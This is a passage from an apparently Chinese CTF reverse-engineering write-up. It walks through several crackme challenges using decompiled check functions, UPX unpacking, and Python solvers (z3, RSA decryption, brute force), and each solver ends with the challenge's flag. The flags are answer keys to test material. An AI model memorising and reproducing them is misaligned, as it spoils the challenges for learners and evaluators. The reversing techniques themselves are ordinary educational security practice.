++*(_DWORD *)&amp;v12[<span class="number">17</span>];</span><br><span class="line">              &#125;</span><br><span class="line">              *(_DWORD *)&amp;v12[<span class="number">17</span>] = <span class="number">0</span>;</span><br><span class="line">              <span class="keyword">while</span> ( *(<span class="type">int</span> *)&amp;v12[<span class="number">17</span>] &lt;= <span class="number">15</span> )</span><br><span class="line">              &#123;</span><br><span class="line">                result = (<span class="type">unsigned</span> __int8)v12[*(_DWORD *)&amp;v12[<span class="number">17</span>]];</span><br><span class="line">                <span class="keyword">if</span> ( *((_BYTE *)v1 + *(_DWORD *)&amp;v12[<span class="number">17</span>]) != (_BYTE)result )</span><br><span class="line">                  <span class="keyword">return</span> result;</span><br><span class="line">                ++*(_DWORD *)&amp;v12[<span class="number">17</span>];</span><br><span class="line">              &#125;</span><br><span class="line">              result = <span class="built_in">printf</span>(<span class="string">&quot;You are correct!&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到只是一个简单的算法，直接得脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> string</span><br><span class="line">v12 = <span class="string">&#x27;Qsw3sj_lz4_Ujw@l&#x27;</span></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> string.printable:  <span class="comment"># ascii表上有127个字符，一个一个试吧</span></span><br><span class="line">        j = <span class="built_in">ord</span>(j)</span><br><span class="line">        x = j</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">chr</span>(x).isupper():</span><br><span class="line">            x = (x - <span class="number">51</span>) % <span class="number">26</span> + <span class="number">65</span></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">chr</span>(x).islower():</span><br><span class="line">            x = (x - <span class="number">79</span>) % <span class="number">26</span> + <span class="number">97</span></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">chr</span>(x) == v12[i]:</span><br><span class="line">            flag += <span class="built_in">chr</span>(j)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;flag&#123;&#x27;</span> + flag + <span class="string">&#x27;&#125;&#x27;</span>)</span><br><span class="line"><span class="comment"># flag&#123;Cae3ar_th4_Gre@t&#125;</span></span><br></pre></td></tr></table></figure><p>上面的这里</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span> ( *(<span class="type">int</span> *)&amp;v12[<span class="number">17</span>] &lt;= <span class="number">15</span> )</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> ( *((<span class="type">char</span> *)v1 + *(_DWORD *)&amp;v12[<span class="number">17</span>]) &gt; <span class="number">64</span> &amp;&amp; *((<span class="type">char</span> *)v1 + *(_DWORD *)&amp;v12[<span class="number">17</span>]) &lt;= <span class="number">90</span> )</span><br><span class="line">        *((_BYTE *)v1 + *(_DWORD *)&amp;v12[<span class="number">17</span>]) = (*((<span class="type">char</span> *)v1 + *(_DWORD *)&amp;v12[<span class="number">17</span>]) - <span class="number">51</span>) % <span class="number">26</span> + <span class="number">65</span>;</span><br><span class="line">    <span class="keyword">if</span> ( *((<span class="type">char</span> *)v1 + *(_DWORD *)&amp;v12[<span class="number">17</span>]) &gt; <span class="number">96</span> &amp;&amp; *((<span class="type">char</span> *)v1 + *(_DWORD *)&amp;v12[<span class="number">17</span>]) &lt;= <span class="number">122</span> )</span><br><span class="line">        *((_BYTE *)v1 + *(_DWORD *)&amp;v12[<span class="number">17</span>]) = (*((<span class="type">char</span> *)v1 + *(_DWORD *)&amp;v12[<span class="number">17</span>]) - <span class="number">79</span>) % <span class="number">26</span> + <span class="number">97</span>;</span><br><span class="line">    ++*(_DWORD *)&amp;v12[<span class="number">17</span>];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里的第一个if判断的是大写字母，第二个判断的是是否是小写字母。所以才有了我们的解题的flag。</p><p>这里我们把<code>*((char *)v1 + *(_DWORD *)&amp;v12[17])</code>这个整体看作<code>ord(j)</code>了，在逆向中，我们也常常这样将一个整体当成一个变量对待。</p><h3 id="GUET-CTF2019-re"><a href="#GUET-CTF2019-re" class="headerlink" title="[GUET-CTF2019]re"></a>[GUET-CTF2019]re</h3><p><strong>TAG:Z3脚本、UPX脱壳</strong></p><p>先拖进IDA64里面什么都没有发现，搜索一下字符串发现还是啥都没有，使用前几天刚更新的exeinfo2021查一下壳。</p><p><img src="/2021/05/28/CTF//image-20210607132422766.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.\upx.exe -d .\attachment\re</span><br></pre></td></tr></table></figure><p>直接使用上方的命令脱一下壳。</p><p><img src="/2021/05/28/CTF//image-20210607132642504.png"></p><p>对上方的关键的字符串进行一下跟踪，追到下面的函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">__int64 __fastcall <span class="title function_">sub_400E28</span><span class="params">(__int64 a1, <span class="type">int</span> a2, <span class="type">int</span> a3, <span class="type">int</span> a4, <span class="type">int</span> a5, <span class="type">int</span> a6)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v6; <span class="comment">// edx</span></span><br><span class="line">  <span class="type">int</span> v7; <span class="comment">// ecx</span></span><br><span class="line">  <span class="type">int</span> v8; <span class="comment">// er8</span></span><br><span class="line">  <span class="type">int</span> v9; <span class="comment">// er9</span></span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line">  __int64 v11; <span class="comment">// [rsp+0h] [rbp-30h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v12; <span class="comment">// [rsp+28h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v12 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  sub_40F950((<span class="type">unsigned</span> <span class="type">int</span>)<span class="string">&quot;input your flag:&quot;</span>, a2, a3, a4, a5, a6, <span class="number">0LL</span>, <span class="number">0LL</span>, <span class="number">0LL</span>, <span class="number">0LL</span>);</span><br><span class="line">  sub_40FA80((<span class="type">unsigned</span> <span class="type">int</span>)<span class="string">&quot;%s&quot;</span>, (<span class="type">unsigned</span> <span class="type">int</span>)&amp;v11, v6, v7, v8, v9, v11);</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="type">unsigned</span> <span class="type">int</span>)sub_4009AE(&amp;v11) )</span><br><span class="line">    sub_410350(<span class="string">&quot;Correct!&quot;</span>);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    sub_410350(<span class="string">&quot;Wrong!&quot;</span>);</span><br><span class="line">  result = <span class="number">0LL</span>;</span><br><span class="line">  <span class="keyword">if</span> ( __readfsqword(<span class="number">0x28</span>u) != v12 )</span><br><span class="line">    sub_443550();</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>再追踪一下<code>sub_4009AE</code>这个函数，发现里面的C代码如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line">_BOOL8 __fastcall <span class="title function_">sub_4009AE</span><span class="params">(<span class="type">char</span> *a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="number">1629056</span> * *a1 != <span class="number">166163712</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="number">6771600</span> * a1[<span class="number">1</span>] != <span class="number">731332800</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="number">3682944</span> * a1[<span class="number">2</span>] != <span class="number">357245568</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="number">10431000</span> * a1[<span class="number">3</span>] != <span class="number">1074393000</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="number">3977328</span> * a1[<span class="number">4</span>] != <span class="number">489211344</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="number">5138336</span> * a1[<span class="number">5</span>] != <span class="number">518971936</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="number">7532250</span> * a1[<span class="number">7</span>] != <span class="number">406741500</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="number">5551632</span> * a1[<span class="number">8</span>] != <span class="number">294236496</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="number">3409728</span> * a1[<span class="number">9</span>] != <span class="number">177305856</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="number">13013670</span> * a1[<span class="number">10</span>] != <span class="number">650683500</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="number">6088797</span> * a1[<span class="number">11</span>] != <span class="number">298351053</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="number">7884663</span> * a1[<span class="number">12</span>] != <span class="number">386348487</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="number">8944053</span> * a1[<span class="number">13</span>] != <span class="number">438258597</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="number">5198490</span> * a1[<span class="number">14</span>] != <span class="number">249527520</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="number">4544518</span> * a1[<span class="number">15</span>] != <span class="number">445362764</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="number">3645600</span> * a1[<span class="number">17</span>] != <span class="number">174988800</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="number">10115280</span> * a1[<span class="number">16</span>] != <span class="number">981182160</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="number">9667504</span> * a1[<span class="number">18</span>] != <span class="number">493042704</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="number">5364450</span> * a1[<span class="number">19</span>] != <span class="number">257493600</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="number">13464540</span> * a1[<span class="number">20</span>] != <span class="number">767478780</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="number">5488432</span> * a1[<span class="number">21</span>] != <span class="number">312840624</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="number">14479500</span> * a1[<span class="number">22</span>] != <span class="number">1404511500</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="number">6451830</span> * a1[<span class="number">23</span>] != <span class="number">316139670</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="number">6252576</span> * a1[<span class="number">24</span>] != <span class="number">619005024</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="number">7763364</span> * a1[<span class="number">25</span>] != <span class="number">372641472</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="number">7327320</span> * a1[<span class="number">26</span>] != <span class="number">373693320</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="number">8741520</span> * a1[<span class="number">27</span>] != <span class="number">498266640</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="number">8871876</span> * a1[<span class="number">28</span>] != <span class="number">452465676</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="number">4086720</span> * a1[<span class="number">29</span>] != <span class="number">208422720</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="number">9374400</span> * a1[<span class="number">30</span>] == <span class="number">515592000</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">5759124</span> * a1[<span class="number">31</span>] == <span class="number">719890500</span>;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>变成数学问题了，变成数学问题就简单的多了。</p><p>看起来应该是<code>a1</code>这个字符数组里面的内容就是我们要找的flag了，并且长度也是32位，符合一般的flag的32位的md5的特征，所以直接解一下方程即可，编写<code>z3-solver</code>脚本如下(注意要先下载<code>z3-solver</code>库)。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line">s = Solver()</span><br><span class="line">a1 = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>):</span><br><span class="line">    a1.append(Int(<span class="string">&#x27;a1[&#x27;</span>+<span class="built_in">str</span>(i)+<span class="string">&#x27;]&#x27;</span>))   <span class="comment"># z3声名整数型的符号变量</span></span><br><span class="line"><span class="comment"># add为添加至z3约束求解器中的内容</span></span><br><span class="line">s.add( <span class="number">1629056</span> * a1[<span class="number">0</span>] == <span class="number">166163712</span> )</span><br><span class="line">s.add( <span class="number">6771600</span> * a1[<span class="number">1</span>] == <span class="number">731332800</span> )</span><br><span class="line">s.add( <span class="number">3682944</span> * a1[<span class="number">2</span>] == <span class="number">357245568</span> )</span><br><span class="line">s.add( <span class="number">10431000</span> * a1[<span class="number">3</span>] == <span class="number">1074393000</span> )</span><br><span class="line">s.add( <span class="number">3977328</span> * a1[<span class="number">4</span>] == <span class="number">489211344</span> )</span><br><span class="line">s.add( <span class="number">5138336</span> * a1[<span class="number">5</span>] == <span class="number">518971936</span> )</span><br><span class="line">s.add( <span class="number">7532250</span> * a1[<span class="number">7</span>] == <span class="number">406741500</span> )</span><br><span class="line">s.add( <span class="number">5551632</span> * a1[<span class="number">8</span>] == <span class="number">294236496</span> )</span><br><span class="line">s.add( <span class="number">3409728</span> * a1[<span class="number">9</span>] == <span class="number">177305856</span> )</span><br><span class="line">s.add( <span class="number">13013670</span> * a1[<span class="number">10</span>] == <span class="number">650683500</span> )</span><br><span class="line">s.add( <span class="number">6088797</span> * a1[<span class="number">11</span>] == <span class="number">298351053</span> )</span><br><span class="line">s.add( <span class="number">7884663</span> * a1[<span class="number">12</span>] == <span class="number">386348487</span> )</span><br><span class="line">s.add( <span class="number">8944053</span> * a1[<span class="number">13</span>] == <span class="number">438258597</span> )</span><br><span class="line">s.add( <span class="number">5198490</span> * a1[<span class="number">14</span>] == <span class="number">249527520</span> )</span><br><span class="line">s.add( <span class="number">4544518</span> * a1[<span class="number">15</span>] == <span class="number">445362764</span> )</span><br><span class="line">s.add( <span class="number">10115280</span> * a1[<span class="number">16</span>] == <span class="number">981182160</span> )</span><br><span class="line">s.add( <span class="number">3645600</span> * a1[<span class="number">17</span>] == <span class="number">174988800</span> )</span><br><span class="line">s.add( <span class="number">9667504</span> * a1[<span class="number">18</span>] == <span class="number">493042704</span> )</span><br><span class="line">s.add( <span class="number">5364450</span> * a1[<span class="number">19</span>] == <span class="number">257493600</span> )</span><br><span class="line">s.add( <span class="number">13464540</span> * a1[<span class="number">20</span>] == <span class="number">767478780</span> )</span><br><span class="line">s.add( <span class="number">5488432</span> * a1[<span class="number">21</span>] == <span class="number">312840624</span> )</span><br><span class="line">s.add( <span class="number">14479500</span> * a1[<span class="number">22</span>] == <span class="number">1404511500</span> )</span><br><span class="line">s.add( <span class="number">6451830</span> * a1[<span class="number">23</span>] == <span class="number">316139670</span> )</span><br><span class="line">s.add( <span class="number">6252576</span> * a1[<span class="number">24</span>] == <span class="number">619005024</span> )</span><br><span class="line">s.add( <span class="number">7763364</span> * a1[<span class="number">25</span>] == <span class="number">372641472</span> )</span><br><span class="line">s.add( <span class="number">7327320</span> * a1[<span class="number">26</span>] == <span class="number">373693320</span> )</span><br><span class="line">s.add( <span class="number">8741520</span> * a1[<span class="number">27</span>] == <span class="number">498266640</span> )</span><br><span class="line">s.add( <span class="number">8871876</span> * a1[<span class="number">28</span>] == <span class="number">452465676</span> )</span><br><span class="line">s.add( <span class="number">4086720</span> * a1[<span class="number">29</span>] == <span class="number">208422720</span> )</span><br><span class="line">s.add( <span class="number">9374400</span> * a1[<span class="number">30</span>] == <span class="number">515592000</span> )</span><br><span class="line">s.add(<span class="number">5759124</span> * a1[<span class="number">31</span>] == <span class="number">719890500</span>)</span><br><span class="line"><span class="comment"># z3约束求解</span></span><br><span class="line">s.check()</span><br><span class="line">res = s.model()</span><br><span class="line">res = <span class="built_in">str</span>(res)[<span class="number">1</span>:<span class="built_in">len</span>(<span class="built_in">str</span>(res))-<span class="number">1</span>].replace(<span class="string">&#x27;,&#x27;</span>, <span class="string">&#x27;&#x27;</span>).replace(<span class="string">&#x27; &#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">a = res.split(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(a)</span><br><span class="line"></span><br><span class="line">flag = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">31</span>):</span><br><span class="line">    temp = a[i].index(<span class="string">&#x27;=&#x27;</span>)</span><br><span class="line">    temp = <span class="built_in">int</span>(temp) + <span class="number">1</span></span><br><span class="line">    flag += <span class="built_in">chr</span>(<span class="built_in">int</span>(a[i][temp:]))</span><br><span class="line"><span class="built_in">print</span>(flag[::-<span class="number">1</span>])</span><br><span class="line"><span class="comment"># flag&#123;e65421110ba03099a1c039337&#125;</span></span><br></pre></td></tr></table></figure><p>开始没发现a1[6]并没有给，看wp知道a1[6]的值为<code>1</code>，故flag为</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;e165421110ba03099a1c039337&#125;</span><br></pre></td></tr></table></figure><h3 id="SUCTF2019-SignIn"><a href="#SUCTF2019-SignIn" class="headerlink" title="[SUCTF2019]SignIn"></a>[SUCTF2019]SignIn</h3><p><strong>TAG:RSA、ELF文件</strong></p><p>没壳，打开一看不就是RSA吗，看到65537就感觉不简单，简单解下RSA即可</p><p><img src="/2021/05/28/CTF//image-20210607165616788.png"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"></span><br><span class="line">n = <span class="number">103461035900816914121390101299049044413950405173712170434161686539878160984549</span></span><br><span class="line">c = <span class="number">0xad939ff59f6e70bcbfad406f2494993757eee98b91bc244184a377520d06fc35</span></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">p = <span class="number">282164587459512124844245113950593348271</span></span><br><span class="line">q = n // p</span><br><span class="line">phi = (p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line">d = gmpy2.invert(e, phi)</span><br><span class="line">m = <span class="built_in">pow</span>(c, d, n)</span><br><span class="line">m = <span class="built_in">int</span>(m)</span><br><span class="line">flag = long_to_bytes(m)</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"><span class="comment"># b&#x27;suctf&#123;Pwn_@_hundred_years&#125;&#x27;</span></span><br></pre></td></tr></table></figure><h3 id="WUSTCTF2020-level1"><a href="#WUSTCTF2020-level1" class="headerlink" title="[WUSTCTF2020]level1"></a>[WUSTCTF2020]level1</h3><p><strong>TAG:一般题目</strong></p><p>给出了两个附件，一个是txt文件，另一个是一般的ELF的64位文件，txt文件给出的应该是程序的输出，将程序拖入64位ida分析，找到关键代码如下:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+4h] [rbp-2Ch]</span></span><br><span class="line">  FILE *stream; <span class="comment">// [rsp+8h] [rbp-28h]</span></span><br><span class="line">  <span class="type">char</span> ptr[<span class="number">24</span>]; <span class="comment">// [rsp+10h] [rbp-20h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v7; <span class="comment">// [rsp+28h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v7 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  stream = fopen(<span class="string">&quot;flag&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">  fread(ptr, <span class="number">1uLL</span>, <span class="number">0x14</span>uLL, stream);</span><br><span class="line">  fclose(stream);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">1</span>; i &lt;= <span class="number">19</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( (i &amp; <span class="number">1</span>) != <span class="number">0</span> )</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;%ld\n&quot;</span>, (<span class="type">unsigned</span> <span class="type">int</span>)(ptr[i] &lt;&lt; i));</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;%ld\n&quot;</span>, (<span class="type">unsigned</span> <span class="type">int</span>)(i * ptr[i]));</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>一般的差不多算是加密的东西，直接得(太签到了)</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">out = [<span class="number">0</span>, <span class="number">198</span>, <span class="number">232</span>, <span class="number">816</span>, <span class="number">200</span>, <span class="number">1536</span>, <span class="number">300</span>, <span class="number">6144</span>, <span class="number">984</span>, <span class="number">51200</span>, <span class="number">570</span>, <span class="number">92160</span>, <span class="number">1200</span>, <span class="number">565248</span>, <span class="number">756</span>, <span class="number">1474560</span>, <span class="number">800</span>, <span class="number">6291456</span>, <span class="number">1782</span>, <span class="number">65536000</span>]</span><br><span class="line"><span class="comment"># 上面首位加上0作为填充位</span></span><br><span class="line"></span><br><span class="line">res = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">20</span>):</span><br><span class="line">    <span class="keyword">if</span> i&amp;<span class="number">1</span> != <span class="number">0</span>:</span><br><span class="line">        temp = out[i] &gt;&gt; i</span><br><span class="line">        res.append(temp)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        temp = out[i] // i</span><br><span class="line">        res.append(temp)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;&#x27;</span>.join(<span class="built_in">chr</span>(i) <span class="keyword">for</span> i <span class="keyword">in</span> res))</span><br><span class="line"><span class="comment"># ctf2020&#123;d9-dE6-20c&#125;</span></span><br></pre></td></tr></table></figure><h3 id="WUSTCTF2020-level2"><a href="#WUSTCTF2020-level2" class="headerlink" title="[WUSTCTF2020]level2"></a>[WUSTCTF2020]level2</h3><p><strong>TAG:UPX脱壳</strong></p><p>打开没有后缀名，misc做习惯了之后总是先把这种比较小得没有后缀名的文件先使用记事本打开看看有什么东西。注意到UPX，直接脱壳</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td 